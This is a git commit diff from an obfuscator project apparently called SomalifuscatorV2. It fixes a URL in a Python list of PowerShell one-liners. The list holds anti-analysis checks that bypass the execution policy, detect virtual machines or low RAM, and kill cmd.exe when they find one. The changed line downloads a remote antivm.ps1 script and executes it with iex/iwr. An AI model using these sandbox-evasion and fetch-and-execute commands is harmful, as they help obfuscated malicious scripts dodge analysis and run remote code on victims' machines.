556c287f8951b67b03ff9269d4fd3def6f1552c4
KDot227 <damndc227@gmail.com>
2024-05-23 12:17:57 -0500

    wrong url again

--- src/util/methods/anti_methods/anti_changes.py
+++ src/util/methods/anti_methods/anti_changes.py
@@ -53,7 +53,7 @@ class AntiChanges:
             # Now that I think about it it would have been a LOT more logical to use encoded command since its all base64
             """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual') { taskkill /F /IM cmd.exe }\"""",
             """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "if((gcim Win32_PhysicalMemory | measure -Property capacity -Sum).sum /1gb -lt 4) {spps -f -n 'cmd' -ErrorAction SilentlyContinue;exit 1}\"""",
-            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr -uri 'https://github.com/KDot227/SomalifuscatorV2/blob/main/src/util/methods/anti_methods/antivm.ps1' -useb)\"""",
+            """powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -Command "iex (iwr -uri 'https://raw.githubusercontent.com/KDot227/SomalifuscatorV2/main/src/util/methods/anti_methods/antivm.ps1' -useb)\"""",
         ]
         # ill add more one day
         ran_choice = random.choice(codes)
